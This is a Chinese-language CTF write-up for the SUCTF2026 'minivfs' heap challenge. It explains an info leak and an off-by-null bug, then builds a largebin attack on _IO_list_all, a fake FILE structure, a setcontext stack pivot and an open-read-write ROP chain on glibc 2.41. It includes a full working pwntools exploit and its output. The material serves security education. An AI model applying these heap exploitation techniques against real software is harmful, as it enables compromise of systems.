# SUCTF2026-minivfs

## 题目简述
题目是 glibc 2.41 下的 VFS 风格堆题，保护全开且 seccomp 限制直接 shell，目标是 ORW。程序提供 `touch/rm/write/cat` 等文件式操作，每个文件槽都有由路径 hash 派生的认证值；可控 chunk 大小被限制在 `0x418..0x500`，天然进入 largebin 相关利用区间。

关键漏洞是两个文件操作的组合：`cat` 按记录的 `cap` 输出整块堆内容，可泄漏 unsorted bin/libc 和残留 heap 指针；`write` 拷贝结束后额外写入 `'\0'`，在相邻 chunk 布局下形成 off-by-null。解法是先稳定泄漏 libc/heap，再利用 largebin 与 chunk overlapping，最终改写可用控制点完成 ORW。

## 解题过程
glibc 2.41，保护全开, 有沙箱, 打ORW.

每个文件操作需要一个认证值，由路径的 hash 再异或常数得到。本地相同算法计算即可。

先看与堆利用相关的几个核心函数。touch 限制申请大小必须位于 0x418..0x500 区间，那么后
续所有可控 chunk 都会进入 largebin。

```javascript
__int64 __fastcall sub_173A(unsigned int idx, const char *name, int auth,
size_t size)
{
void *ptr;

if ( idx >= 0x10 )
return -1;
if ( used[idx] )
return -2;
if ( size <= 0x417 || size > 0x500 )
return -4;
ptr = malloc(size);
if ( !ptr )

return -3;
used[idx] = 1;
real_auth[idx] = auth;
snprintf(slot_name[idx], 0x60u, "%s", name);
cap[idx] = size;
buf[idx] = ptr;
...
return 0;
}
```

rm 只是 free 掉 chunk，再把槽位元数据清空。

```
__int64 __fastcall sub_194F(unsigned int idx, int auth)
{
if ( idx >= 0x10 )
return -1;
if ( !used[idx] )
return -2;
if ( auth != real_auth[idx] )
return -3;
free(buf[idx]);
memset(slot[idx], 0, 0x90u);
return 0;
}
```

漏洞点出现在 cat 和 write 。cat 是按 cap 整块输出。只要一块堆内存曾进入过 unsorted
bin，或者残留过 heap 指针，就可以通过短写入后整块输出的方式直接泄露。

```
__int64 __fastcall sub_1A34(unsigned int idx, int auth)
{
if ( idx >= 0x10 )
return -1;
if ( !used[idx] )
return -2;
if ( auth != real_auth[idx] )
return -3;
if ( cap[idx] )
write(1, buf[idx], cap[idx]);
putchar(10);
return 0;
}
```

write 在拷贝结束后还会额外写入一个 '\0' 。配合相邻 chunk 布局，可以清掉下一个 chunk 的
PREV_INUSE 位，形成稳定的 off-by-null。

首先 libc 泄露。把一个 0x428 的 chunk 送进 unsorted bin，然后用同大小 chunk 重新取回，再只
写入 8 字节，最后用 cat 把整块输出。这样泄露出的 leak[8:16] 即为 main_arena 相关指
针。实际利用序列如下：

```
touch a 0x428
touch c 0x428
rm a
touch x 0x428
write x 8
cat x
```

heap 泄露不能脱离后续堆布局单独设计，否则会导致后面的 chunk 相对位置发生变化。经过调试, 稳
定的做法是布置如下顺序：

```
touch a 0x500
touch B 0x500
touch c 0x4e8
touch v 0x500
touch d 0x428
touch H 0x500
rm a
rm c
rm d
touch p 0x500
touch x 0x4e8
write x 8
cat x
```

这里 x 会复用之前的 chunk，内部残留堆指针, 调试得到的计算关系是：

```
heap_ptr = u64(leak[8:16])
heap_base = heap_ptr - 0x1600
```

开始堆利用。先 rm H ，可以使后面申请出的 A 与 Q 相邻，off-by-null 于是落到目标 chunk 上。
在 A 中伪造 fake chunk，随后利用 write A 0x428 末尾的额外 '\0' 清掉 Q 的
PREV_INUSE 。

然后执行：

```
write A 0x428
rm Q
touch i 0x428
touch h 0x4a8
```

A 与 i 会形成 overlap。后续即可通过对 A 的读写，直接篡改 i 作为空闲 chunk 时的链表元数
据。

为了打 largebin，继续申请四个 chunk：

```
touch l 0x418
touch j 0x500
touch f 0x500
touch e 0x500
```

地址满足：

```
l_user = heap_base + 0x2500
l_hdr = l_user - 0x10
f_user = heap_base + 0x2E30
e_user = heap_base + 0x3340
```

接下来将 overlap chunk i 送入 largebin，再让 l 参与下一轮插入，从而利用被篡改的
bk_nextsize 完成任意地址写。

```
rm i
touch Q 0x500
rm l
```

此时通过 cat A 观察 overlap 区，可确认 i 的 bk_nextsize 位于 A+0x58 。将其修改为
_IO_list_all - 0x20 , 再触发一次同类申请, 于是 l 从 unsorted 插入到 largebin，从而把
l_hdr 写入 _IO_list_all 。至此，后续退出流程会从 fake FILE 开始执行。

直接使用 setcontext+0x3d 不稳定。动调发现调用路径中的 rdx 不是一个稳定可控的堆指针，
直接跳过去会导致上下文恢复过程读取错误数据, 选择完整 setcontext + 自定义栈迁移的方案, 先
让 _IO_wdoallocbuf 调到完整 setcontext ，再由 setcontext 恢复寄存器，最后通过
pop rdx ; leave ; ret 完成第一跳。

fake FILE 布置在 l 对应的 chunk header，即 fp = l_hdr 。关键字段如下：

```
[fp+0x78] = frame
[fp+0x88] = lock = f_user
[fp+0xA0] = wide_data = e_user
[fp+0xA8] = rip = pop rdx ; leave ; ret
[fp+0xC0] = _mode = 1
[fp+0xD8] = vtable = _IO_wfile_jumps
[fp+0xE0] = fenv ptr = fp + 0x1E0
[fp+0x1C0] = mxcsr = 0x1F80
```

fenv 与 mxcsr 必须补齐，缺失会崩溃。

fake wide_data 则布置在 e 。关键原因在于 _IO_wdoallocbuf 这条路径最终会取：

```
fp->_wide_data -> [wide+0xE0] -> call [ptr+0x68]
```

因此只需构造：

```
[wide+0xE0] = wide + 0x180
[wide+0x1E8] = setcontext
```

即可把控制流导向完整 setcontext 。

栈迁移的思路如下。首先在 e 开头放一个长度值；然后把 frame 设置为真正的 ROP 起始位置；再
让 fake FILE 中的返回地址为 pop rdx ; leave ; ret 。这样完整 setcontext 执行完毕
后，会先把 rsp 恢复到 e ，把 rbp 恢复到 frame ，再 ret 到 pop rdx ; leave ;
ret 。于是第一跳会把长度弹进 rdx ，随后 leave 完成真正的栈迁移，之后即可执行正常的
ORW 链。

打远程发现 flag 是假的, 所以调用 getdents64 先查看目录下文件, 然后打 ORW.

### exp:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = ELF("./mini_vfs")
context.arch = "amd64"
context.log_level = "info"
libc = ELF(context.binary.libc.path)

HOST = "<target>"
PORT = 10000

def calc_hash(path: str) -> int:
h = 0x811C9DC5
for c in path.encode():
h = ((c ^ h) * 0x1000193) & 0xFFFFFFFF
t = ((h >> 16) ^ h) & 0xFFFFFFFF
t = (2146121005 * t) & 0xFFFFFFFF
t = ((t >> 15) ^ t) & 0xFFFFFFFF
t = ((-2073254261) * t) & 0xFFFFFFFF
return ((t >> 16) ^ t) & 0xFFFFFFFF

def calc_auth(path: str) -> int:
return calc_hash(path) ^ 0xA5A5A5A5

def sync_prompt(p):
p.recvuntil(b"vfs> ")

def sl(p, data: bytes):
p.sendline(data)

def touch(p, path: str, size: int):
sl(p, f"touch {path} {size:#x} {calc_auth(path)}".encode())
sync_prompt(p)

def rm(p, path: str):
sl(p, f"rm {path} {calc_auth(path)}".encode())

sync_prompt(p)

def cat(p, path: str) -> bytes:
sl(p, f"cat {path} {calc_auth(path)}".encode())
return p.recvuntil(b"vfs> ", drop=True)

def write_body(p, path: str, n: int, body: bytes):
sl(p, f"write {path} {n:#x} {calc_auth(path)}".encode())
p.sendafter(b"> ", body)
sync_prompt(p)

def leak_libc(p) -> int:
touch(p, "a", 0x428)
touch(p, "c", 0x428)
rm(p, "a")
touch(p, "x", 0x428)
write_body(p, "x", 8, b"ABCDEFGH")
leak = cat(p, "x")
arena = u64(leak[8:16])
libc.address = arena - 0x210B00
log.success(f"libc @ {libc.address:#x}")
rm(p, "x")
rm(p, "c")
return libc.address

def leak_heap(p) -> int:
touch(p, "a", 0x500)
touch(p, "B", 0x500)
touch(p, "c", 0x4E8)
touch(p, "v", 0x500)
touch(p, "d", 0x428)
touch(p, "H", 0x500)
rm(p, "a")
rm(p, "c")
rm(p, "d")
touch(p, "p", 0x500)
touch(p, "x", 0x4E8)
write_body(p, "x", 8, b"ABCDEFGH")
leak = cat(p, "x")
heap_ptr = u64(leak[8:16])
heap_base = heap_ptr - 0x1600
log.success(f"heap ptr @ {heap_ptr:#x}")
log.success(f"heap @ {heap_base:#x}")

return heap_base

def build_overlap(p, heap_base: int):
rm(p, "H")

a = heap_base + 0x16C0
fake = a + 0x30
payload = bytearray(b"A" * 0x428)
payload[0x30:0x38] = p64(0)
payload[0x38:0x40] = p64(0x3F0)
payload[0x40:0x48] = p64(fake)
payload[0x48:0x50] = p64(fake)
payload[0x420:0x428] = p64(0x3F0)

touch(p, "A", 0x428)
touch(p, "Q", 0x4F8)
touch(p, "P", 0x500)
write_body(p, "A", 0x428, bytes(payload))
rm(p, "Q")
touch(p, "i", 0x428)
touch(p, "h", 0x4A8)
log.success("house of einherjar done")

def build_fake_file(fp: int, lock: int, wide: int, frame: int, rip: int) ->
bytes:
fenv = fp + 0x1E0
payload = bytearray()
payload = payload.ljust(0x78 - 0x10, b"\x00")
payload += p64(frame)
payload = payload.ljust(0x88 - 0x10, b"\x00")
payload += p64(lock)
payload = payload.ljust(0xA0 - 0x10, b"\x00")
payload += p64(wide)
payload = payload.ljust(0xA8 - 0x10, b"\x00")
payload += p64(rip)
payload = payload.ljust(0xC0 - 0x10, b"\x00")
payload += p64(1)
payload = payload.ljust(0xD8 - 0x10, b"\x00")
payload += p64(libc.sym["_IO_wfile_jumps"])
payload = payload.ljust(0xE0 - 0x10, b"\x00")
payload += p64(fenv)
payload = payload.ljust(0x1C0 - 0x10, b"\x00")
payload += p32(0x1F80)
return bytes(payload)

def build_wide_rop(
wide: int,
frame: int,
path_addr: int,
buf_addr: int,
target: bytes,
size: int,
is_dir: bool,
) -> bytes:
pop_rax = libc.address + 0xE4E97
pop_rdi = libc.address + 0x119E9C
pop_rsi = libc.address + 0x11B07D
syscall = libc.address + 0x9F4A6
sys_getdents64 = 217

open_flags = 0x10000 if is_dir else 0
io_syscall = sys_getdents64 if is_dir else 0

wvtable = wide + 0x180
frame_off = frame - wide
path_off = path_addr - wide

payload = bytearray()
payload += p64(size)
payload = payload.ljust(0x18, b"\x00")
payload += p64(0)
payload += p64(1)
payload = payload.ljust(0xE0, b"\x00")
payload += p64(wvtable)
payload = payload.ljust(0x1E8, b"\x00")
payload += p64(libc.sym["setcontext"])

chain = flat(
0,
pop_rdi,
path_addr,
pop_rsi,
open_flags,
pop_rax,
2,
syscall,
pop_rdi,
3,
pop_rsi,
buf_addr,
pop_rax,

io_syscall,
syscall,
pop_rdi,
1,
pop_rsi,
buf_addr,
pop_rax,
1,
syscall,
)
payload = payload.ljust(frame_off, b"\x00")
payload += chain
payload = payload.ljust(path_off, b"\x00")
payload += target
return bytes(payload)

def decode_dirents(blob: bytes):
out = []
i = 0
while i + 19 <= len(blob):
reclen = u16(blob[i + 16 : i + 18])
if reclen < 20 or i + reclen > len(blob):
break
name = blob[i + 19 : i + reclen].split(b"\x00", 1)[0]
if name:
out.append(name.decode(errors="replace"))
i += reclen
return out

def drain_result(p) -> bytes:
data = p.recvall(timeout=3)
if b"bye\n" in data:
data = data.split(b"bye\n", 1)[1]
return data

p = remote(HOST, PORT)
sync_prompt(p)

leak_libc(p)
heap_base = leak_heap(p)
build_overlap(p, heap_base)

l_user = heap_base + 0x2500
l_hdr = l_user - 0x10

f_user = heap_base + 0x2E30
e_user = heap_base + 0x3340
frame = e_user + 0x200
path_addr = e_user + 0x300
buf_addr = heap_base + 0x2920
pop_rdx_leave_ret = libc.address + 0x9E68D

touch(p, "l", 0x418)
touch(p, "j", 0x500)
touch(p, "f", 0x500)
touch(p, "e", 0x500)

fake_file = build_fake_file(l_hdr, f_user, e_user, frame, pop_rdx_leave_ret)
fake_wide = build_wide_rop(e_user, frame, path_addr, buf_addr, b".\x00",
0x200, True)

write_body(p, "l", len(fake_file), fake_file)
write_body(p, "f", 0x40, b"\x00" * 0x40)
write_body(p, "e", len(fake_wide), fake_wide)

rm(p, "i")
touch(p, "Q", 0x500)
rm(p, "l")

io_list_all = libc.sym["_IO_list_all"]
p1_view = bytearray(cat(p, "A")[:0x60])
p1_view[0x58:0x60] = p64(io_list_all - 0x20)
write_body(p, "A", len(p1_view), bytes(p1_view))

touch(p, "q", 0x500)
sl(p, b"quit")
names = decode_dirents(drain_result(p))

target = next((f"./{name}" for name in names if name.startswith("flag_")),
None)
log.success(f"Remote flag filename: {target}")

p = remote(HOST, PORT)
sync_prompt(p)

leak_libc(p)
heap_base = leak_heap(p)
build_overlap(p, heap_base)

l_user = heap_base + 0x2500
l_hdr = l_user - 0x10
f_user = heap_base + 0x2E30

e_user = heap_base + 0x3340
frame = e_user + 0x200
path_addr = e_user + 0x300
buf_addr = heap_base + 0x2920
pop_rdx_leave_ret = libc.address + 0x9E68D

touch(p, "l", 0x418)
touch(p, "j", 0x500)
touch(p, "f", 0x500)
touch(p, "e", 0x500)

fake_file = build_fake_file(l_hdr, f_user, e_user, frame, pop_rdx_leave_ret)
fake_wide = build_wide_rop(
e_user, frame, path_addr, buf_addr, target.encode() + b"\x00", 0x80, False
)

write_body(p, "l", len(fake_file), fake_file)
write_body(p, "f", 0x40, b"\x00" * 0x40)
write_body(p, "e", len(fake_wide), fake_wide)

rm(p, "i")
touch(p, "Q", 0x500)
rm(p, "l")

io_list_all = libc.sym["_IO_list_all"]
p1_view = bytearray(cat(p, "A")[:0x60])
p1_view[0x58:0x60] = p64(io_list_all - 0x20)
write_body(p, "A", len(p1_view), bytes(p1_view))

touch(p, "q", 0x500)
sl(p, b"quit")
data = drain_result(p)
print(data)

"""
❯ py exp.py
[*] '/home/neptune/suctf2026/pwn/SU_minivfs/mini_vfs'
Arch: amd64-64-little
RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
SHSTK: Enabled
IBT: Enabled
[*] '/home/neptune/.config/cpwn/pkgs/2.41-6ubuntu1.2/amd64/libc6_2.41-
6ubuntu1.2_amd64/usr/lib/x86_64-linux-gnu/libc.so.6'
Arch: amd64-64-little

RELRO: Full RELRO
Stack: Canary found
NX: NX enabled
PIE: PIE enabled
FORTIFY: Enabled
SHSTK: Enabled
IBT: Enabled
[+] Opening connection to <target> on port 10000: Done
[+] libc @ 0x7ffac137f000
[+] heap ptr @ 0x5587dc12d600
[+] heap @ 0x5587dc12c000
[+] house of einherjar done
[+] Receiving all data: Done (516B)
[*] Closed connection to <target> port 10000
[+] Remote flag filename: ./flag_78f16013a3c04854
[+] Opening connection to <target> on port 10000: Done
[+] libc @ 0x7f2589e87000
[+] heap ptr @ 0x55c4f80e4600
[+] heap @ 0x55c4f80e3000
[+] house of einherjar done
[+] Receiving all data: Done (132B)
[*] Closed connection to <target> port 10000
b'flag{min1_vfs_5afe_b4ck3nd_chunk5_h1dd3n_s3cre7_SUCTF_2026}\n\x00\x00\x00\x00
```

\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x0
0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x
00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
x00\x00\x00\x00\x00'
344 """

## 方法总结
- 核心技巧：glibc largebin + off-by-null ORW
- 识别信号：可控文件抽象背后是堆块，存在整块输出泄露和尾部 NUL 越界。
- 复用要点：先用 unsorted/largebin 泄露，再 off-by-null 做 chunk overlap 或 largebin attack，最后布置 ORW。
